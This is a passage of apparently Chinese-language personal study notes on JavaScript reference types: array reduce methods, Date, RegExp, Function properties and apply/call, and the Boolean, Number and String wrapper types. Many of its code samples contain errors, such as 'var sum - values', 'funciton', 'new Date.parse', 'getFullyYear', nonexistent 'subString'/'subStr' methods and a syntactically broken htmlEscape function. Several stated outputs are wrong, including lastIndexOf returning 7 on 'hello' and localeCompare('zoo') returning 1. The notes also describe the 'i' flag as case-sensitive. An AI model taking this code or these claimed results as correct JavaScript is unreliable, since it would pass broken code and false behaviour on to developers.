title="缩小方法（归并方法）："></a>缩小方法（归并方法）：</h3><h4 id="function-reduce"><a href="#function-reduce" class="headerlink" title="function reduce:"></a>function reduce:</h4><p>接收4个参数：前一个值，当前值，项的索引值和数组对象，这个函数中返回的任何值都会作为第一个参数自动传给下一项<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var values = [1,2,3,4,5];</span><br><span class="line">var sum - values.reduce(function(prev,cur,index,array)&#123;</span><br><span class="line">    return prev + cur;</span><br><span class="line">&#125;);</span><br><span class="line">alert(sum);   //15</span><br></pre></td></tr></table></figure></p><h4 id="function-reduceRight"><a href="#function-reduceRight" class="headerlink" title="function reduceRight:"></a>function reduceRight:</h4><p>与reduce相似，只是从数组最后一项开始，向前遍历<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var values = [1,2,3,4,5];</span><br><span class="line">var sum = values.reduceRight(function(prev,cur,index,array)&#123;</span><br><span class="line">    return prev + cur;</span><br><span class="line">&#125;);</span><br><span class="line">alert(sum);   //15</span><br></pre></td></tr></table></figure></p><h2 id="Date类型"><a href="#Date类型" class="headerlink" title="Date类型"></a>Date类型</h2><h3 id="构造函数："><a href="#构造函数：" class="headerlink" title="构造函数："></a>构造函数：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var nom = new Date();</span><br><span class="line">var now = new Date.parse(&quot;YYYY-MM-DD&quot;);   //2019-02-19</span><br><span class="line">var now = new Date(Date.UTC(2015,4,5,17,55,55));  //2015/4/5 17:55:55</span><br><span class="line">var start = Date.now();  //获取毫秒数</span><br></pre></td></tr></table></figure><h3 id="继承方法："><a href="#继承方法：" class="headerlink" title="继承方法："></a>继承方法：</h3><p>不同浏览器对toLocaleString(),toString()和valueOf()方法解释不同</p><h3 id="日期格式化方法："><a href="#日期格式化方法：" class="headerlink" title="日期格式化方法："></a>日期格式化方法：</h3><p>toDateString()：以特定于实现的格式显示星期几、月、日和年<br>toTimeString()：以特定于实现的格式显示时分秒和时区<br>toLocaleDateString()：以特定于地区的格式显示星期几、日、月、年<br>toLocaleTimeString()：以特定于地区的格式显示时分秒<br>toUTCString()：以特定于实现的格式完整的UTC日期</p><h3 id="日期-时间组件方法："><a href="#日期-时间组件方法：" class="headerlink" title="日期/时间组件方法："></a>日期/时间组件方法：</h3><p>getTime()：返回表示日期的毫秒数<br>getFullyYear()：取得4位数的年份<br>getMonth()：返回日期中的月份，0-11表示1月至12月<br>getDate()：返回日期月份中的天数(1-31)<br>getDay()：返回日期中星期的星期几(0-6)表示，星期日至星期六<br>getHours()：返回日期中的小时数(0-23)</p><h2 id="RegExp类型"><a href="#RegExp类型" class="headerlink" title="RegExp类型"></a>RegExp类型</h2><h3 id="基础语法："><a href="#基础语法：" class="headerlink" title="基础语法："></a>基础语法：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var expression = /pattern/flags;</span><br></pre></td></tr></table></figure><p>pattern部分：可以是任何简单或复杂的正则表达式<br>flags部分：每个正则表达式都可带有1或多个标志</p><blockquote><p>g：表示全局模式，即模式将被应用于所有字符串<br>i：标识区分大小写模式，即在确定匹配项时忽略模式与字符串的大小写<br>m：表示多行模式，即在到达一行文本末尾时还会继续查找下一行是否存在与模式匹配的项</p></blockquote><p>与其他语言中的正则表达式类似，模式中使用的所有元字符都必须转义:([(\^$|)?*+.])<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var pattern = /[bc]at/i;</span><br><span class="line">var pattern2 = new RegExp(&quot;[bc]at&quot;,&quot;i&quot;);</span><br></pre></td></tr></table></figure></p><p>在ECMAScript中，正则表达式字面量始终会共享同一个RegExp实例，而使用构造函数创建的每一个新RegExp实例都是一个新实例</p><h3 id="RegExp实例属性："><a href="#RegExp实例属性：" class="headerlink" title="RegExp实例属性："></a>RegExp实例属性：</h3><p>global：布尔值，表示是否设置了g标志<br>ignoreCase：布尔值，表示是否设置了i标志<br>lastIndex：整数，表示开始搜索下一个匹配项的字符位置，从0算起<br>multiline：布尔值，表示是否设置了m标志<br>source：正则表达式的字符串表示，按照字面量形式而传入构造函数中的字符串模式返回<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var pattern1 = /\[bc\]at/i;</span><br><span class="line">alert(pattern1.global);   //false</span><br><span class="line">alert(pattern1.ignoreCase);   //true</span><br><span class="line">alert(pattern1.multiline);   //false</span><br><span class="line">alert(pattern1.lastIndex);   //0</span><br><span class="line">alert(pattern1.source);   //&quot;\[bc\]at&quot;</span><br></pre></td></tr></table></figure></p><h3 id="RegExp实例方法："><a href="#RegExp实例方法：" class="headerlink" title="RegExp实例方法："></a>RegExp实例方法：</h3><h4 id="function-exec"><a href="#function-exec" class="headerlink" title="function exec:"></a>function exec:</h4><p>专门为捕获组而设计，返回包含第一个匹配信息的数组<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var text = &quot;mom and dad and baby&quot;;</span><br><span class="line">var pattern = /mom(and dad(and baby)?)?/gi;</span><br><span class="line">var matches = pattern.exec(text);</span><br><span class="line">alert(matches.index);  //0</span><br><span class="line">alert(matches.input);  //&quot;mom and dad and baby&quot;</span><br><span class="line">alert(matches[0]);   //&quot;mom and dad and baby&quot;</span><br><span class="line">alert(matches[1]);   //&quot;and dad and baby&quot;</span><br><span class="line">alert(matches[2]);   //&quot;and baby&quot;</span><br></pre></td></tr></table></figure></p><h4 id="function-test"><a href="#function-test" class="headerlink" title="function test:"></a>function test:</h4><p>接受一个字符串参数，在模式与该参数匹配的情况下返回true，否则，返回false<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var text = &quot;000-000-0000&quot;;</span><br><span class="line">var pattern = /\d&#123;3&#125;-\d&#123;2&#125;-\d&#123;4&#125;/;</span><br><span class="line">if(pattern.test(text))&#123;</span><br><span class="line">    alert(&quot;The pattern was matched&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="function-toLocaleString-和toString"><a href="#function-toLocaleString-和toString" class="headerlink" title="function toLocaleString()和toString():"></a>function toLocaleString()和toString():</h4><p>返回正则表达式的字面量，与创建正则表达式的方式无关</p><h3 id="构造函数属性："><a href="#构造函数属性：" class="headerlink" title="构造函数属性："></a>构造函数属性：</h3><p>input：返回最近一次要匹配的字符串<br>leftContext：返回input字符串中lastMatch之前的文本<br>lastMatch：返回最近一次的匹配项<br>lastParen：返回最近一次匹配的捕获组<br>multiline：布尔值，表示是否所有表达式都是用多行模式<br>rightContext：input字符串中lastMatch之后的文本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var text = &quot;this has been a short summer&quot;;</span><br><span class="line">var patern = /(:)hort/g;</span><br><span class="line">if(pattern.test(text))&#123;</span><br><span class="line">    alert(RegExp.input);   //this has been a short summer</span><br><span class="line">    alert(RegExp.rightContext);   //this has been a </span><br><span class="line">    alert(RegExp.lastMatch);   //short</span><br><span class="line">    alert(RegExp.lastParen);   //s</span><br><span class="line">    alert(RegExp.multiline);   //false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="模式的局限性："><a href="#模式的局限性：" class="headerlink" title="模式的局限性："></a>模式的局限性：</h3><p>ECMAScript不支持的特性：</p><blockquote><p>匹配字符串开始和结尾的\A和\Z锚<br>向后查找<br>并集和交集类<br>原子组<br>Unicode支持<br>命名的捕获组<br>s(single，单行)和x(free-spacing，无间隔)匹配模式<br>条件匹配<br>正则表达式注释</p></blockquote><h2 id="Function类型"><a href="#Function类型" class="headerlink" title="Function类型"></a>Function类型</h2><h3 id="定义方式："><a href="#定义方式：" class="headerlink" title="定义方式："></a>定义方式：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function sum(num1,num2)&#123;</span><br><span class="line">    return num1 + num2;</span><br><span class="line">&#125;</span><br><span class="line">var sum = function(num1,num2)&#123;</span><br><span class="line">    return num1 + num2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="没有重载："><a href="#没有重载：" class="headerlink" title="没有重载："></a>没有重载：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function addNumber(num)&#123;</span><br><span class="line">    return num + 100;</span><br><span class="line">&#125;</span><br><span class="line">funciton addNumber(num)&#123;</span><br><span class="line">    return num + 200;</span><br><span class="line">&#125;</span><br><span class="line">var result = addNumber(100);   //300</span><br></pre></td></tr></table></figure><h3 id="函数声明与函数表达式："><a href="#函数声明与函数表达式：" class="headerlink" title="函数声明与函数表达式："></a>函数声明与函数表达式：</h3><p>解析器会率先读取函数声明，并使其在执行任何代码之前可用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">alert(sum(0,10));</span><br><span class="line">function sum(num1,num2)&#123;</span><br><span class="line">    return num1 + num2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="作为值的函数："><a href="#作为值的函数：" class="headerlink" title="作为值的函数："></a>作为值的函数：</h3><p>可以像传递参数一样把一个函数传递给另一个函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function callSomeFunction(someFunction,someArgument)&#123;</span><br><span class="line">    return someFunction(someArgument);</span><br><span class="line">&#125;</span><br><span class="line">function add10(num)&#123;</span><br><span class="line">    return num + 10;</span><br><span class="line">&#125;</span><br><span class="line">function greeting(name)&#123;</span><br><span class="line">    return &quot;Hello &quot; + name;</span><br><span class="line">&#125;</span><br><span class="line">var result = callSomeFunction(add10,10);</span><br><span class="line">alert(result);   //20</span><br><span class="line">var result2 = callSomeFunction(greeting,&quot;Van&quot;);</span><br><span class="line">alert(result2);   //&quot;Hello Van&quot;</span><br></pre></td></tr></table></figure></p><p>可以将一个函数作为另一个函数的结果返回<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function createComparisonFunction(propertyName)&#123;</span><br><span class="line">    return function (object1,object2)&#123;</span><br><span class="line">        var value1 = object1[propertyName];</span><br><span class="line">        var value2 = object2[propertyName];</span><br><span class="line">        if(value1 &lt; value2)&#123;</span><br><span class="line">            return -1;</span><br><span class="line">        &#125;else if(value1 &gt; value2)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="函数内部属性："><a href="#函数内部属性：" class="headerlink" title="函数内部属性："></a>函数内部属性：</h3><h4 id="callee"><a href="#callee" class="headerlink" title="callee:"></a>callee:</h4><p>一个指针，指向拥有这个arguments对象的函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//函数执行与函数名&quot;factorial&quot;紧耦合在一起</span><br><span class="line">function factorial(num)&#123;</span><br><span class="line">    if(num &lt;= 1)&#123;</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return num * factorial(num-1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//无论函数取什么名字都能正常递归</span><br><span class="line">function factorial(num)&#123;</span><br><span class="line">    if(num &lt;= 1)&#123;</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return num * arguments.callee(num-1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="this："><a href="#this：" class="headerlink" title="this："></a>this：</h4><p>引用函数当前执行的环境对象<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">window.color = &quot;red&quot;;</span><br><span class="line">var o = &#123;color:&quot;blue&quot;&#125;;</span><br><span class="line">function sayColor()&#123;</span><br><span class="line">    alert(this.color);</span><br><span class="line">&#125;</span><br><span class="line">sayColor();  //&quot;red&quot;，this为全局对象</span><br><span class="line">o.sayColor = sayColor;</span><br><span class="line">alert(0.sayColor());  //&quot;blue&quot;，this为对象o</span><br></pre></td></tr></table></figure></p><h4 id="caller"><a href="#caller" class="headerlink" title="caller:"></a>caller:</h4><p>ES5引入，保存调用当前函数的函数引用，如果实在全局调用，其值为null<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function outer()&#123;</span><br><span class="line">    inner();</span><br><span class="line">&#125;</span><br><span class="line">function inner()&#123;</span><br><span class="line">    alert(inner.caller); //可解耦合写成alert(arguments.callee.caller)</span><br><span class="line">&#125;</span><br><span class="line">outer();  //outer</span><br></pre></td></tr></table></figure></p><h3 id="函数的属性和方法："><a href="#函数的属性和方法：" class="headerlink" title="函数的属性和方法："></a>函数的属性和方法：</h3><h4 id="length属性"><a href="#length属性" class="headerlink" title="length属性:"></a>length属性:</h4><p>表示函数希望接收的命名参数个数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function sayName(name)&#123;&#125;</span><br><span class="line">function sum(num1,num2)&#123;&#125;</span><br><span class="line">function sayHi()&#123;&#125;</span><br><span class="line">alert(sayName.length);  //1</span><br><span class="line">alert(sum.length);  //2</span><br><span class="line">alert(sayHi.length);  //0</span><br></pre></td></tr></table></figure></p><h4 id="prototype属性"><a href="#prototype属性" class="headerlink" title="prototype属性:"></a>prototype属性:</h4><p>保存它们所有实例方法的真正所在</p><h4 id="function-apply"><a href="#function-apply" class="headerlink" title="function apply:"></a>function apply:</h4><p>在特定的作用域中调用函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function sum(num1,num2)&#123;</span><br><span class="line">    return num1 + num2;</span><br><span class="line">&#125;</span><br><span class="line">function callSum1(num1,num2)&#123;</span><br><span class="line">    return sum.apply(this,arguments);</span><br><span class="line">&#125;</span><br><span class="line">function callSum2(num1,num2)&#123;</span><br><span class="line">    return sum.apply(this,[num1,num2]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="function-apply-1"><a href="#function-apply-1" class="headerlink" title="function apply:"></a>function apply:</h4><p>与apply方法的作用相同，区别在于除了第一个参数this,其余参数都须直接传给函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function sum(num1,num2)&#123;</span><br><span class="line">    return num1 + num2;</span><br><span class="line">&#125;</span><br><span class="line">function callSum(num1,num2)&#123;</span><br><span class="line">    return sum.call(this,num1,num2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>apply()和call()真正强大是能够扩充函数赖以运行的作用域<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">window.color = &quot;red&quot;;</span><br><span class="line">var o = &#123;color:&quot;blue&quot;&#125;;</span><br><span class="line">function sayColor()&#123;</span><br><span class="line">    alert(this.color);</span><br><span class="line">&#125;</span><br><span class="line">sayColor();  //&quot;red&quot;</span><br><span class="line">sayColor.call(this);  //&quot;red&quot;</span><br><span class="line">sayColor.call(window);  //&quot;red&quot;</span><br><span class="line">sayColor.call(o);   //&quot;blue&quot;</span><br></pre></td></tr></table></figure></p><p>用这种方法来扩充作用域对象不需要与方法有任何耦合关系</p><h2 id="基本包装类型"><a href="#基本包装类型" class="headerlink" title="基本包装类型"></a>基本包装类型</h2><h3 id="Boolean类型："><a href="#Boolean类型：" class="headerlink" title="Boolean类型："></a>Boolean类型：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var falseObject = new Boolean(false);</span><br><span class="line">var result = falseObjet &amp;&amp; true;</span><br><span class="line">alert(result);  //true</span><br><span class="line">var falseValue = false;</span><br><span class="line">result = falseValue &amp;&amp; true;</span><br><span class="line">alert(result);  //false</span><br></pre></td></tr></table></figure><h3 id="Number类型："><a href="#Number类型：" class="headerlink" title="Number类型："></a>Number类型：</h3><p>Number类型重写了valueOf,toLocalString和toString方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var num = 10;</span><br><span class="line">alert(num.toString());   //&quot;10&quot;，默认十进制表示</span><br><span class="line">alert(num.toString(2));  //&quot;1010&quot;，二进制表示</span><br><span class="line">alert(num.toFixed(2));   //&quot;10.00&quot;，按照指定小数位返回</span><br><span class="line">alert(num.toExponential(1));   //&quot;1.0e+1&quot;，按照指定位数返回指数表示法</span><br></pre></td></tr></table></figure></p><h3 id="String类型："><a href="#String类型：" class="headerlink" title="String类型："></a>String类型：</h3><h4 id="字符方法："><a href="#字符方法：" class="headerlink" title="字符方法："></a>字符方法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var stringValue = &quot;hello world&quot;;</span><br><span class="line">alert(stringValue.charAt(1));  //&quot;e&quot;</span><br><span class="line">alert(stringValue.charCodeAt(1));  //&quot;101&quot;,小写字母e字符编码</span><br></pre></td></tr></table></figure><h4 id="字符串操作方法："><a href="#字符串操作方法：" class="headerlink" title="字符串操作方法："></a>字符串操作方法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">var stringValue = &quot;hello&quot;;</span><br><span class="line">var result = stringValue.concat(&quot; world&quot;,&quot;!&quot;);  //返回新字符串</span><br><span class="line">alert(result);  //&quot;hello world!&quot;</span><br><span class="line">alert(stringValue);  //&quot;hello&quot;</span><br><span class="line"></span><br><span class="line">var stringValue = &quot;hello world&quot;;</span><br><span class="line">alert(stringValue.slice(3));  //&quot;lo world&quot;</span><br><span class="line">alert(stringValue.subString(3));  //&quot;lo world&quot;</span><br><span class="line">alert(stringValue.subStr(3));  //&quot;lo world&quot;</span><br><span class="line"></span><br><span class="line">alert(stringValue.slice(3,7));  //&quot;lo w&quot;，起始位置，结束位置</span><br><span class="line">alert(stringValue.subString(3,7));  //&quot;lo w&quot;，同上</span><br><span class="line">alert(stringValue.subStr(3,7));  //&quot;lo worl&quot;，起始位置，返回字符个数</span><br><span class="line"></span><br><span class="line">alert(stringValue.slice(-3));  //&quot;rld&quot;</span><br><span class="line">alert(stringValue.subString(-3));  //&quot;hello world&quot;，把所有负数转换成0</span><br><span class="line">alert(stringValue.subStr(-3));  //&quot;rld&quot;，负数加上数组长度</span><br><span class="line"></span><br><span class="line">alert(stringValue.slice(3,-4));  //&quot;lo w&quot;</span><br><span class="line">alert(stringValue.subString(3,-4));  //&quot;hel&quot;，把负数变成0，从小的开始</span><br><span class="line">alert(stringValue.subStr(3,-4));  //&quot; &quot;，把负数变成0</span><br></pre></td></tr></table></figure><h4 id="字符串位置方法："><a href="#字符串位置方法：" class="headerlink" title="字符串位置方法："></a>字符串位置方法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var stringValue = &quot;hello&quot;;</span><br><span class="line">alert(stringValue.indexOd(&quot;o&quot;));  //4</span><br><span class="line">alert(stringValue.lastIndexOf(&quot;o&quot;));  //7</span><br></pre></td></tr></table></figure><p>可以通过循环调用，来找到所有匹配的子字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var stringValue = &quot;Lorem ipsum color sit amet, consectetur adipisicing elit&quot;;</span><br><span class="line">var positions = new Array();</span><br><span class="line">var pos = stringValue.indexOf(&quot;e&quot;);</span><br><span class="line">while(pos&gt;-1)&#123;</span><br><span class="line">    positions.push(pos);</span><br><span class="line">    pos = stringValue.indexOf(&quot;e&quot;,pos+1);</span><br><span class="line">&#125;</span><br><span class="line">alert(positions);  //&quot;3,24,32,35,52&quot;</span><br></pre></td></tr></table></figure></p><h4 id="trim方法："><a href="#trim方法：" class="headerlink" title="trim方法："></a>trim方法：</h4><p>喊出前置和后缀的所有空格<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var stringValue = &quot;  hello world&quot;;</span><br><span class="line">var trimedString = stringValue.trim();</span><br><span class="line">alert(stringValue);  //&quot;  hello world&quot;</span><br><span class="line">alert(trimedString);  //&quot;hello world&quot;</span><br></pre></td></tr></table></figure></p><h4 id="字符串大小写转换方法："><a href="#字符串大小写转换方法：" class="headerlink" title="字符串大小写转换方法："></a>字符串大小写转换方法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var stringValue = &quot;hello world&quot;;</span><br><span class="line">alert(stringValue.toLocaleUpperCase());   //&quot;HELLO WORLD&quot;</span><br><span class="line">alert(stringValue.toUpperCase());   //&quot;HELLO WORLD&quot;</span><br><span class="line">alert(stringValue.toLocaleLowerCase());   //&quot;hello world&quot;</span><br><span class="line">alert(stringValue.toLowerCase());   //&quot;hello world&quot;</span><br></pre></td></tr></table></figure><h4 id="字符串模式匹配方法："><a href="#字符串模式匹配方法：" class="headerlink" title="字符串模式匹配方法："></a>字符串模式匹配方法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var text = &quot;cat,bat,sat,fat&quot;;</span><br><span class="line">var pattern = /.at/;</span><br><span class="line">//与pattern.exec()相同</span><br><span class="line">var matches = text.match(pattern);</span><br><span class="line">alert(matches.index);  //0</span><br><span class="line">alert(matches[0]);  //&quot;cat&quot;，返回第一个匹配的字符串</span><br><span class="line">alert(pattern.lastIndex);  //0</span><br><span class="line"></span><br><span class="line">var pos = text.search(/at/);</span><br><span class="line">alert(pos);  //1，返回第一个匹配项的索引，没有找到则返回-1</span><br><span class="line">var result = text.replace(&quot;at&quot;,&quot;ond&quot;);  //只替换第一个子字符串</span><br><span class="line">alert(result);  //&quot;cond,bat,sat,fat&quot;</span><br><span class="line">result = text.replace(/at/g,&quot;ond&quot;);</span><br><span class="line">alert(result);  //&quot;cond,bond,sond,fond&quot;</span><br></pre></td></tr></table></figure><p>使用replace第二个参数，可以实现更加精细的替换<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function htmlEscape(text)&#123;</span><br><span class="line">    return text.replace(/[&lt;&gt;&quot;&amp;]/g,function(match,pos,orignalText))&#123;</span><br><span class="line">        switch(match)&#123;</span><br><span class="line">            case &quot;&lt;&quot;:</span><br><span class="line">                return &quot;&amp;lt&quot;;</span><br><span class="line">            case &quot;&gt;&quot;:</span><br><span class="line">                return &quot;&amp;gt&quot;;</span><br><span class="line">            case &quot;&amp;&quot;:</span><br><span class="line">                return &quot;&amp;amp&quot;;</span><br><span class="line">            case &quot;\&quot;&quot;:</span><br><span class="line">                return &quot;&amp;quot&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="split方法："><a href="#split方法：" class="headerlink" title="split方法："></a>split方法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var colorText = &quot;red,blue,green,yellow&quot;;</span><br><span class="line">var colors1 = colorText.split(&quot;,&quot;);  //[&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;,&quot;yellow&quot;]</span><br><span class="line">var colors2 = colorText.split(&quot;,&quot;,2);  //[&quot;red&quot;,&quot;blue&quot;]，只包含两项</span><br><span class="line">var colors2 = colorText.split(/[^\,]t/);  //[&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;]</span><br></pre></td></tr></table></figure><h4 id="LocaleCompare方法："><a href="#LocaleCompare方法：" class="headerlink" title="LocaleCompare方法："></a>LocaleCompare方法：</h4><p>比较两个字符串，如果字符串在字母表中应该排在字符串参数之前，则返回负数，排在之后，则返回一个正数，等于则返回0<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var stringValue = &quot;yellow&quot;;</span><br><span class="line">alert(stringValue.localeCompare(&quot;black&quot;));  //1</span><br><span class="line">alert(stringValue.localeCompare(&quot;yellow&quot;));  //0</span><br><span class="line">alert(stringValue.localeCompare(&quot;zoo&quot;));  //1</span><br></pre></td></tr></table></figure></p><h4 id="fromCharCode方法："><a href="#fromCharCode方法：" class="headerlink" title="fromCharCode方法："></a>fromCharCode方法：</h4><p>接收一或多个字符编码，将它们转换成一个字符串<br><figure 